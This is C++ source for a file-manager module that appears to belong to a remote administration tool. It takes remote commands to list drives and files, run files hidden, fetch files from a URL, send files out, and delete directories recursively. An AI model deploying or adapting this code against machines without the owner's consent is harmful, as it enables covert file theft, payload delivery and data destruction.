#include "FileManager.h"
#include <process.h>
#include "file_transfer_common.h"

CFileManager::CFileManager(CClient*pClient, 
	Module * owner,
	typeRun run, LPVOID kernel) :
	CEventHandler(pClient, FILE_MANAGER)
{
	//init buffer.
	m_pCurDir = (TCHAR*)calloc(0x10000, sizeof(TCHAR));
	m_SrcPath = (TCHAR*)calloc(0x10000, sizeof(TCHAR));
	m_FileList = (TCHAR*)calloc(0x10000, sizeof(TCHAR));

	m_bMove = FALSE;

	//
	m_kernel = kernel;
	m_run_module = run;

	m_owner = owner;
	if (m_owner)
		get_module(m_owner);
}


CFileManager::~CFileManager()
{
	if (m_pCurDir)
	{
		free(m_pCurDir);
		m_pCurDir = NULL;
	}
	if (m_SrcPath)
	{
		free(m_SrcPath);
		m_SrcPath = NULL;
	}
	if (m_FileList)
	{
		free(m_FileList);
		m_FileList = NULL;
	}

	if (m_owner)
		put_module(m_owner);
}


void CFileManager::OnClose()
{

}
void CFileManager::OnOpen()
{

}

void CFileManager::OnEvent(UINT32 e, BYTE *lpData, UINT32 Size)
{
	switch (e)
	{
	case FILE_MGR_CHDIR:
		OnChangeDir((TCHAR*)lpData);
		break;
	case FILE_MGR_GETLIST:
		OnGetCurList();
		break;
	case FILE_MGR_UP:
		OnUp();
		break;
	case FILE_MGR_SEARCH:
		OnSearch();
		break;
	case FILE_MGR_UPLOADFROMDISK:
		OnUploadFromDisk((TCHAR*)lpData);
		break;
	case FILE_MGR_UPLOADFRURL:
		OnUploadFromUrl((TCHAR*)lpData);
		break;
	case FILE_MGR_DOWNLOAD:
		OnDownload((TCHAR*)lpData);
		break;
	case FILE_MGR_RUNFILE_HIDE:
	case FILE_MGR_RUNFILE_NORMAL:
		OnRunFile(e, (TCHAR*)lpData);
		break;
	case FILE_MGR_REFRESH:
		OnRefresh();
		break;
	case FILE_MGR_NEWFOLDER:
		OnNewFolder();
		break;
	case FILE_MGR_RENAME:
		OnRename((TCHAR*)lpData);
		break;
	case FILE_MGR_DELETE:
		OnDelete((TCHAR*)lpData);
		break;
	case FILE_MGR_COPY:
		OnCopy((TCHAR*)lpData);
		break;
	case FILE_MGR_CUT:
		OnCut((TCHAR*)lpData);
		break;
	case FILE_MGR_PASTE:
		OnPaste((TCHAR*)lpData);
		break;
	}
}


void CFileManager::OnUp()
{
	TCHAR *pNewDir = (TCHAR*)malloc(sizeof(TCHAR) *(lstrlen(m_pCurDir) + 1));
	
	lstrcpy(pNewDir, m_pCurDir);

	int PathLen = lstrlen(pNewDir);

	if (PathLen)
	{
		if (PathLen > 3)
		{
			TCHAR *p = pNewDir + lstrlen(pNewDir) - 1;

			while (p >= pNewDir && p[0] != '\\' && p[0] != '/')
				p--;

			p[0] = 0;
		}
		else
			pNewDir[0] = 0;
	}
	OnChangeDir(pNewDir);
	free(pNewDir);
}
//修改目录,服务器应该在成功之后再请求List.;

void CFileManager::OnChangeDir(TCHAR *FileName)
{
	//一个字节statu + CurLocation + List.;
	BOOL   bStatu = ChDir(FileName);
	DWORD  dwBufLen = 0;
	BYTE*  Buff = NULL;

	dwBufLen += 1;
	dwBufLen += sizeof(TCHAR) *(lstrlen(m_pCurDir) + 1);

	Buff = (BYTE*)malloc(dwBufLen);
	Buff[0] = bStatu;

	lstrcpy((TCHAR*)&Buff[1], m_pCurDir);

	Send(FILE_MGR_CHDIR_RET, Buff, dwBufLen);
	free(Buff);
}

void CFileManager::OnGetCurList()
{
	if (!lstrlen(m_pCurDir))
	{
		SendDriverList();
	}
	else
	{
		SendFileList();
	}
}

void CFileManager::SendDriverList()
{
	DriverInfo	dis[26] = { 0 };				//最多26
	DWORD		dwUsed = 0;
	DWORD dwDrivers = GetLogicalDrives();
	TCHAR szRoot[] = { 'A',':','\\',0 };
	while (dwDrivers)
	{
		if (dwDrivers & 1)
		{
			DriverInfo*pDi = &dis[dwUsed++];
			SHFILEINFO si = { 0 };

			pDi->szName[0] = szRoot[0];
			GetVolumeInformation(szRoot, 0, 0, 0, 0, 0, pDi->szFileSystem, 128);

			SHGetFileInfo(
				szRoot, 
				FILE_ATTRIBUTE_NORMAL,
				&si, 
				sizeof(si),
				SHGFI_USEFILEATTRIBUTES | SHGFI_DISPLAYNAME | SHGFI_TYPENAME);

			lstrcpy(&pDi->szName[1], si.szDisplayName);
			lstrcpy(pDi->szTypeName, si.szTypeName);

			GetDiskFreeSpaceEx(szRoot, 0, &pDi->Total, &pDi->Free);

			pDi->dwType = GetDriveType(szRoot);
		}

		dwDrivers >>= 1;
		szRoot[0]++;
	}
	//发送回复.
	Send(FILE_MGR_GETLIST_RET, (char*)&dis, sizeof(DriverInfo) * dwUsed);
}


void CFileManager::SendFileList()
{
	TCHAR  *StartDir = (TCHAR*)malloc((lstrlen(m_pCurDir) + 3) * sizeof(TCHAR));
	lstrcpy(StartDir, m_pCurDir);
	lstrcat(StartDir, TEXT("\\*"));

	DWORD	dwCurBuffSize = 0x10000;		//64kb
	BYTE*	FileList = (BYTE*)malloc(dwCurBuffSize);
	DWORD	dwUsed = 0;

	WIN32_FIND_DATA fd = { 0 };
	HANDLE hFirst = FindFirstFile(StartDir, &fd);
	BOOL bNext = TRUE;
	while (hFirst != INVALID_HANDLE_VALUE && bNext)
	{
		if (	
			!(fd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY) ||
			(lstrcmp(fd.cFileName, TEXT(".")) && lstrcmp(fd.cFileName, TEXT(".."))))
		{
			if ((dwCurBuffSize - dwUsed) <
				(sizeof(FmFileInfo) + sizeof(TCHAR) * lstrlen(fd.cFileName)))
			{
				dwCurBuffSize *= 2;
				FileList = (BYTE*)realloc(FileList, dwCurBuffSize);
			}

			FmFileInfo*pFmFileInfo = (FmFileInfo*)(FileList + dwUsed);
			pFmFileInfo->dwFileAttribute = fd.dwFileAttributes;
			pFmFileInfo->dwFileSizeHi = fd.nFileSizeHigh;
			pFmFileInfo->dwFileSizeLo = fd.nFileSizeLow;

			memcpy(&pFmFileInfo->dwLastWriteLo, &fd.ftLastWriteTime, sizeof(FILETIME));

			lstrcpy(pFmFileInfo->szFileName, fd.cFileName);

			dwUsed += (((char*)(pFmFileInfo->szFileName) - (char*)pFmFileInfo) + sizeof(TCHAR)* (lstrlen(fd.cFileName) + 1));
		}

		bNext = FindNextFile(hFirst, &fd);
	}

	FindClose(hFirst);
	free(StartDir);
	//最后添加一个空项作为结尾.;
	if ((dwCurBuffSize - dwUsed) < sizeof(FmFileInfo))
	{
		dwCurBuffSize *= 2;
		FileList = (BYTE*)realloc(FileList, dwCurBuffSize);
	}
	FmFileInfo*pFmFileInfo = (FmFileInfo*)(FileList + dwUsed);
	memset(pFmFileInfo, 0, sizeof(FmFileInfo));
	dwUsed += sizeof(FmFileInfo);

	//发送回复.;
	Send(FILE_MGR_GETLIST_RET, FileList, dwUsed);
	free(FileList);
}

BOOL CFileManager::ChDir(const TCHAR * Dir)
{
	BOOL bResult = FALSE;
	BOOL bIsDrive = FALSE;

	//根目录;
	if (Dir[0] == 0)
	{
		memset(m_pCurDir, 0, 0x10000);
		return TRUE;
	}
	//
	TCHAR *pTemp = (TCHAR*)malloc(sizeof(TCHAR) * (lstrlen(Dir) + 3));

	lstrcpy(pTemp, Dir);

	if ((Dir[0] <'A' || Dir[0]>'Z') &&
		(Dir[0] <'a' || Dir[0]>'z'))
		return FALSE;

	if (Dir[1] != ':' && (Dir[2] != 0 && Dir[2] != '\\' && Dir[2] != '/'))
		return FALSE;

	//加上\\*
	lstrcat(pTemp, TEXT("\\*"));

	const TCHAR *pIt  = &pTemp[3];
	TCHAR *      pNew = &pTemp[2];

	while (pNew[0])
	{
		*pNew++ = '\\';
		//跳过\\,/
		while(pIt[0] && (pIt[0] == '/' || pIt[0] == '\\'))
			pIt++;
		//找到文件名
		while (pIt[0] && (pIt[0] != '/' && pIt[0] != '\\'))
			*pNew++ = *pIt++;
		//到了文件名之后,可能是'\\' '/'或者空.
		*pNew = *pIt++;
	}
	//盘符
	WIN32_FIND_DATA fd = { 0 };
	//看一下这个文件夹是否可以访问.
	HANDLE hFile = FindFirstFile(pTemp, &fd);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		bResult = TRUE;
		lstrcpy(m_pCurDir, pTemp);
		//去掉*
		m_pCurDir[lstrlen(m_pCurDir) - 1] = 0;

		if (lstrlen(m_pCurDir)>3)
			m_pCurDir[lstrlen(m_pCurDir) - 1] = 0;	//非根目录,去掉最后的
	}

	if (hFile != INVALID_HANDLE_VALUE)
		FindClose(hFile);		
	
	free(pTemp);
	return bResult;
}


void CFileManager::OnRunFile(DWORD Event,TCHAR*FileName)
{
	DWORD dwShow = SW_SHOWNORMAL;
	TCHAR *pIt = FileName;

	if (Event == FILE_MGR_RUNFILE_HIDE)
		dwShow = SW_HIDE;

	while (pIt[0])
	{
		//跳过\n;
		while (pIt[0] && pIt[0] == '\n') 
			pIt++;

		if (pIt[0])
		{
			TCHAR *pFileName = pIt;
			//找到结尾.;
			while (pIt[0] && pIt[0] != '\n') 
				pIt++;
			
			TCHAR old = pIt[0];
			pIt[0] = 0;
			//
			TCHAR*pFile = (TCHAR*)malloc((lstrlen(m_pCurDir) + 1 + lstrlen(pFileName) + 1) * sizeof(TCHAR));
			
			lstrcpy(pFile, m_pCurDir);
			lstrcat(pFile, TEXT("\\"));
			lstrcat(pFile, pFileName);

			ShellExecute(NULL, TEXT("open"), pFile, NULL, m_pCurDir, dwShow);

			free(pFile);
			pIt[0] = old;
		}
	}
}

void CFileManager::OnRefresh()
{
	OnChangeDir(m_pCurDir);
}

#include "utils.h"

void CFileManager::OnNewFolder()
{
	//错误....
	TCHAR szError[0x100];

	if (lstrlen(m_pCurDir) == 0)
		return;
	
	for (int i = 0; i < 0x7fffffff;i++){
		
		//make dir name...
		TCHAR DirName[MAX_PATH] = TEXT("New Folder");
		
		if (i)
		{
			wsprintf(DirName, TEXT("New Folder (%d)"), i);
		}
		//calc path length
		size_t len = sizeof(TCHAR)*(lstrlen(m_pCurDir) + 1 + lstrlen(DirName) + 1);
		//alloc buffer..
		TCHAR * NewDirFullName = new TCHAR[len];

		wsprintf(NewDirFullName, TEXT("%s\\%s"), m_pCurDir, DirName);

		BOOL Success = CreateDirectory(NewDirFullName, NULL);
		
		//
		if (Success)
		{
			WIN32_FIND_DATA fd = { 0 };

			if (INVALID_HANDLE_VALUE == FindFirstFile(NewDirFullName, &fd))
			{
				wsprintf(szError, TEXT("FindFirstFile Failed With Error :%d "), GetLastError());
				Send(FILE_MGR_ERROR, szError, (lstrlen(szError) + 1) * sizeof(TCHAR));
				delete[] NewDirFullName;
				return;
			}

			size_t len = sizeof(DWORD) * 5 + sizeof(TCHAR) * (lstrlen(fd.cFileName) + 1);
			
			FmFileInfo * info = (FmFileInfo*)new BYTE[len];

			info->dwFileAttribute = fd.dwFileAttributes;
			info->dwFileSizeHi = fd.nFileSizeHigh;
			info->dwFileSizeLo = fd.nFileSizeLow;

			info->dwLastWriteHi = fd.ftLastWriteTime.dwHighDateTime;
			info->dwLastWriteLo = fd.ftLastWriteTime.dwLowDateTime;

			lstrcpy(info->szFileName, fd.cFileName);
			Send(FILE_MGR_NEW_FOLDER_SUCCESS, info, len);
			delete info;
			delete[] NewDirFullName;
			return;
		}
		//
		if (GetLastError() != ERROR_ALREADY_EXISTS)
		{
			wsprintf(szError, TEXT("CreateDirectory Failed With Error :%d "), GetLastError());
			Send(FILE_MGR_ERROR, szError, (lstrlen(szError) + 1) * sizeof(TCHAR));
			delete[] NewDirFullName;
			return;
		}
	}
}
void CFileManager::OnRename(TCHAR* FileName)
{
	TCHAR*pNewName = NULL;

	if (lstrlen(m_pCurDir) == 0)
		return;

	if ((pNewName = StrStr(FileName, TEXT("\n"))) == 0)
		return;

	*pNewName++ = 0;

	TCHAR * From = (TCHAR*)malloc(sizeof(TCHAR)*(lstrlen(m_pCurDir) + 1 + lstrlen(FileName) + 1));
	TCHAR * To = (TCHAR*)malloc(sizeof(TCHAR)*(lstrlen(m_pCurDir) + 1 + lstrlen(pNewName) + 1));
	
	lstrcpy(From, m_pCurDir);
	lstrcpy(To, m_pCurDir);

	lstrcat(From, TEXT("\\"));
	lstrcat(To, TEXT("\\"));

	lstrcat(From, FileName);
	lstrcat(To, pNewName);

	MoveFile(From, To);

	free(To);
	free(From);
}


BOOL MakesureDirExist(const TCHAR* Path, BOOL bIncludeFileName = FALSE);

typedef void(*callback)(TCHAR*szFile, BOOL bIsDir, DWORD dwParam);

static void dfs_BrowseDir(TCHAR *Dir, callback pCallBack,DWORD dwParam)
{
	TCHAR*pStartDir = (TCHAR*)malloc(sizeof(TCHAR)*(lstrlen(Dir) + 3));
	WIN32_FIND_DATA fd = { 0 };
	BOOL bNext = TRUE;
	HANDLE hFindFile = NULL;

	lstrcpy(pStartDir, Dir);
	lstrcat(pStartDir, TEXT("\\*"));

	
	hFindFile = FindFirstFile(pStartDir, &fd);

	while (hFindFile != INVALID_HANDLE_VALUE && bNext)
	{
		if (!(fd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY) ||
			(lstrcmp(fd.cFileName, TEXT(".")) && lstrcmp(fd.cFileName, TEXT(".."))))
		{
			TCHAR *szFileName = (TCHAR*)malloc(sizeof(TCHAR)*(lstrlen(Dir) + 1 + lstrlen(fd.cFileName) + 1));

			lstrcpy(szFileName, Dir);
			lstrcat(szFileName, TEXT("\\"));
			lstrcat(szFileName, fd.cFileName);

			//目录的话先遍历
			if (fd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY)
			{
				dfs_BrowseDir(szFileName, pCallBack,dwParam);
			}
			pCallBack(szFileName, fd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY, dwParam);
			free(szFileName);
		}
		bNext =  FindNextFile(hFindFile, &fd);
	}
	if (hFindFile)
		 FindClose(hFindFile);

	free(pStartDir);
}

void FMDeleteFile(TCHAR*szFileName, BOOL bIsDir,DWORD dwParam)
{
	if (bIsDir)
	{
		RemoveDirectory(szFileName);
		return;
	}
	DeleteFile(szFileName);
}

void CFileManager::OnDelete(TCHAR *FileName)
{
	//文件名用\n隔开
	TCHAR*pIt = (TCHAR*)FileName;
	TCHAR*pFileName;

	if (lstrlen(m_pCurDir) == 0)
		return;

	while (pIt[0])
	{
		//跳过\n
		pFileName = NULL;
		while (pIt[0] && pIt[0] == '\n')
			pIt++;

		if (pIt[0])
		{
			WIN32_FIND_DATA fd;
			HANDLE hFindFile = NULL;

			pFileName = pIt;
			//找到结尾.
			while (pIt[0] && pIt[0] != '\n')
				pIt++;
			TCHAR old = pIt[0];
			pIt[0] = 0;
			//
			TCHAR *szFile = (TCHAR*)malloc(
				sizeof(TCHAR) * (lstrlen(m_pCurDir) + 1 + lstrlen(pFileName) + 1));

			lstrcpy(szFile, m_pCurDir);
			lstrcat(szFile, TEXT("\\"));
			lstrcat(szFile, pFileName);
			//
			

			hFindFile = FindFirstFile(szFile, &fd);
			if (hFindFile != INVALID_HANDLE_VALUE)
			{
				if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				{
					dfs_BrowseDir(szFile,FMDeleteFile,0);
					RemoveDirectory(szFile);
				}
				else
				{
					DeleteFile(szFile);
				}
				FindClose(hFindFile);
			}
			free(szFile);
			//
			pIt[0] = old;
		}
	}
}

void CFileManager::OnCopy(TCHAR *FileName)
{
	TCHAR *p = NULL;
	if ((p = StrStr(FileName, TEXT("\n"))))
	{
		*p++ = NULL;
		lstrcpy(m_SrcPath, FileName);
		lstrcpy(m_FileList, p);
		m_bMove = FALSE;
	}
}
	

void CFileManager::OnCut(TCHAR *FileName)
{
	TCHAR *p = NULL;
	if ((p = StrStr(FileName, TEXT("\n"))))
	{
		*p++ = NULL;
		lstrcpy(m_SrcPath, FileName);
		lstrcpy(m_FileList, p);
		m_bMove = TRUE;
	}
}

void CFileManager::FMCpOrMvFile(TCHAR *szFileName, BOOL bIsDir, DWORD dwParam)
{
	//复制操作目录不用管,该目录下面的所有文件已经复制完了.
	CFileManager*pMgr = (CFileManager*)dwParam;
	TCHAR *pNewFileName = NULL;

	if (bIsDir)
	{
		if (pMgr->m_bMove)
			RemoveDirectory(szFileName);

		return;
	}
	pNewFileName = (TCHAR*)malloc(
		sizeof(TCHAR)*(lstrlen(pMgr->m_pCurDir) + 1 + lstrlen(szFileName) - lstrlen(pMgr->m_SrcPath) + 1));
	//
	lstrcpy(pNewFileName, pMgr->m_pCurDir);
	lstrcat(pNewFileName, szFileName + lstrlen(pMgr->m_SrcPath));
	//确保目录存在
	MakesureDirExist(pNewFileName, 1);
	
	if (pMgr->m_bMove)
		MoveFile(szFileName, pNewFileName);
	else
		CopyFile(szFileName, pNewFileName,FALSE);

	free(pNewFileName);
}

/*
	2022-10-24
	1.先找出所有文件，保存起来，并发送给服务端总个数
	2.没完成一个之后，就发一个信息。(进度更新)

*/

void CFileManager::OnPaste(TCHAR *FileName)
{

	TCHAR*pIt = m_FileList;
	TCHAR*pFileName;

	//不允许往驱动器目录复制
	if (lstrlen(m_pCurDir) == 0 || lstrlen(m_SrcPath) == 0)
		return;

	//都在一个目录下面,不需要复制
	if (lstrcmp(m_pCurDir, m_SrcPath) == 0)
		return;

	while (pIt[0])
	{
		pFileName = NULL;
		while (pIt[0] && pIt[0] == '\n')
			pIt++;
		if (pIt[0])
		{
			pFileName = pIt;
			//找到结尾.
			while (pIt[0] && pIt[0] != '\n')
				pIt++;
			TCHAR old = pIt[0];
			pIt[0] = 0;
			//源文件
			TCHAR *szSrcFile = (TCHAR*)malloc(sizeof(TCHAR) * (lstrlen(m_SrcPath) + 1 + lstrlen(pFileName) + 1));
			lstrcpy(szSrcFile, m_SrcPath);
			lstrcat(szSrcFile, TEXT("\\"));
			lstrcat(szSrcFile, pFileName);

			//不允许把目录复制到自己的子目录下面
			DWORD dwSrcLen = lstrlen(szSrcFile);
			DWORD dwDestLen = lstrlen(m_pCurDir);
			if (dwDestLen >= dwSrcLen && !memcmp(m_pCurDir, szSrcFile, dwSrcLen) 
				&& (m_pCurDir[dwSrcLen] == 0 || m_pCurDir[dwSrcLen] == '\\'))
			{
				//C:\asdasf --> C:\asdasf\aaaaa ,不允许这样操作.貌似递归会停不下来
			}
			else
			{
				WIN32_FIND_DATA fd = { 0 };
				HANDLE hFindFile = FindFirstFile(szSrcFile, &fd);

				if (hFindFile != INVALID_HANDLE_VALUE)
				{
					if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
					{
						dfs_BrowseDir(szSrcFile, FMCpOrMvFile, (DWORD)this);
						if (m_bMove)
						{
							RemoveDirectory(szSrcFile);
						}
					}
					else
					{
						//单个文件,复制或移动到当前目录.
						TCHAR *pNewFile = (TCHAR*)malloc(
							sizeof(TCHAR)*(lstrlen(m_pCurDir) + 1 + lstrlen(fd.cFileName) + 1));

						lstrcpy(pNewFile, m_pCurDir);
						lstrcat(pNewFile, TEXT("\\"));
						lstrcat(pNewFile, fd.cFileName);
						//
						if (m_bMove)
							MoveFile(szSrcFile, pNewFile);
						else
							CopyFile(szSrcFile, pNewFile, FALSE);
						free(pNewFile);
					}
					FindClose(hFindFile);
				}
			}
			free(szSrcFile);
			pIt[0] = old;
		}
	}
}

static void file_downloader_param_release(Params * Params)
{
	LPVOID * ArgList = (LPVOID*)(Params + 1);
	free(ArgList[1]);
	free(ArgList[2]);
	free(Params);
}


void CFileManager::OnUploadFromUrl(TCHAR *lpszUrl)
{
	Params * lpParams = (Params*)malloc(sizeof(Params) + sizeof(LPVOID) * 3);
	LPVOID* ArgList = (LPVOID*)(lpParams + 1);

	lpParams->num = 2;
	lpParams->release = file_downloader_param_release;

	ArgList[0] = 0;
	ArgList[1] = malloc(sizeof(TCHAR) * (lstrlen(lpszUrl) + 1));
	lstrcpy((TCHAR*)ArgList[1], lpszUrl);

	ArgList[2] = malloc(sizeof(TCHAR) * (lstrlen(m_pCurDir) + 1));
	lstrcpy((TCHAR*)ArgList[2], m_pCurDir);

	m_run_module(m_kernel, TEXT("filedownloader"), TEXT("ModuleEntry"), lpParams);
}



static void file_transfer_param_release(Params * Params)
{
	LPVOID * ArgList = (LPVOID*)(Params + 1);
	free(ArgList[1]);
	free(ArgList[2]);
	free(ArgList[3]);

	free(Params);
}


void CFileManager::OnUploadFromDisk(TCHAR *FileList)
{
	TCHAR * SrcDir = FileList;
	FileList += (lstrlen(FileList) + 1);

	Params * lpParams = (Params*)malloc(sizeof(Params) + sizeof(LPVOID) * 4);
	LPVOID* ArgList = (LPVOID*)(lpParams + 1);

	lpParams->num = 3;
	lpParams->release = file_downloader_param_release;
	
	ArgList[0] = (LPVOID)MNFT_DUTY_RECEIVER;
	ArgList[1] = malloc(sizeof(TCHAR) * (lstrlen(SrcDir) + 1));
	lstrcpy((TCHAR*)ArgList[1], SrcDir);

	ArgList[2] = malloc(sizeof(TCHAR) * (lstrlen(m_pCurDir) + 1));
	lstrcpy((TCHAR*)ArgList[2], m_pCurDir);

	ArgList[3] = malloc(sizeof(TCHAR) * (lstrlen(FileList) + 1));
	lstrcpy((TCHAR*)ArgList[3], FileList);

	m_run_module(m_kernel, TEXT("filetransfer"), TEXT("ModuleEntry"), lpParams);
}


void CFileManager::OnDownload(TCHAR *FileList)
{
	TCHAR * DestDir = FileList;
	FileList += (lstrlen(FileList) + 1);
	
	Params * lpParams = (Params*) malloc(sizeof(Params) + sizeof(LPVOID) * 4);
	LPVOID* ArgList = (LPVOID*)(lpParams + 1);

	lpParams->num = 3;
	lpParams->release = file_downloader_param_release;


	ArgList[0] = (LPVOID)MNFT_DUTY_SENDER;
	ArgList[1] = malloc(sizeof(TCHAR) * (lstrlen(m_pCurDir) + 1));
	lstrcpy((TCHAR*)ArgList[1], m_pCurDir);

	ArgList[2] = malloc(sizeof(TCHAR) * (lstrlen(DestDir) + 1));
	lstrcpy((TCHAR*)ArgList[2], DestDir);

	ArgList[3] = malloc(sizeof(TCHAR) * (lstrlen(FileList) + 1));
	lstrcpy((TCHAR*)ArgList[3], FileList);

	m_run_module(m_kernel, TEXT("filetransfer"), TEXT("ModuleEntry"), lpParams);
}


void CFileManager::OnSearch()
{
	m_run_module(m_kernel, TEXT("filesearch"), TEXT("ModuleEntry"), NULL);
}


